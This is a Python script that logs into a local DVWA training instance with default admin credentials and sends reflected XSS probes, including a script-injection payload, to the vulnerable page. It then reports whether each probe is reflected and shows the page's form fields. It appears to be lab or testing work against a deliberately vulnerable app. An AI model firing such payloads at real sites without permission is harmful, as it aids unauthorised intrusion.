import requests
from bs4 import BeautifulSoup

session = requests.Session()

# Login with CSRF token
print('Authenticating to DVWA...')
resp = session.get('http://localhost/dvwa/login.php')
soup = BeautifulSoup(resp.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'user_token'}).get('value')

session.post('http://localhost/dvwa/login.php', data={
    'username': 'admin',
    'password': 'password',
    'Login': 'Login',
    'user_token': csrf_token
})

print(f'Authenticated with PHPSESSID: {session.cookies.get("PHPSESSID")}')

# Test XSS reflection
print('\nTesting XSS payload reflection...')
payloads = [
    ('<marker>', '<marker>'),
    ('"><script>alert(1)</script>', '"><script'),
    ('xsstest123', 'xsstest123'),
]

for payload, search_str in payloads:
    url = f'http://localhost/dvwa/vulnerabilities/xss_r/?name={payload}'
    resp = session.get(url)
    
    found = search_str in resp.text
    print(f'\nPayload: {payload[:50]}')
    print(f'  Reflected: {found}')
    
    if found:
        idx = resp.text.find(search_str)
        start = max(0, idx - 80)  
        end = min(len(resp.text), idx + 150)
        snippet = resp.text[start:end]
        print(f'  Context: ...{snippet}...')

# Also check the full XSS form/page structure
print('\n\nXSS Page Structure:')
xss_resp = session.get('http://localhost/dvwa/vulnerabilities/xss_r/')
soup = BeautifulSoup(xss_resp.text, 'html.parser')

# Find input fields
inputs = soup.find_all('input')
print(f'Found {len(inputs)} input fields:')
for inp in inputs:
    name = inp.get('name', 'no-name')
    type_ = inp.get('type', 'no-type')
    value = inp.get('value', '')[:50]
    print(f'  - {name}: type={type_}, value={value}')

# Find the main content area that might show results
content = soup.find(id='content')
if content:
    text = content.get_text()[:400]
    print(f'\nContent area preview:')
    print(text)
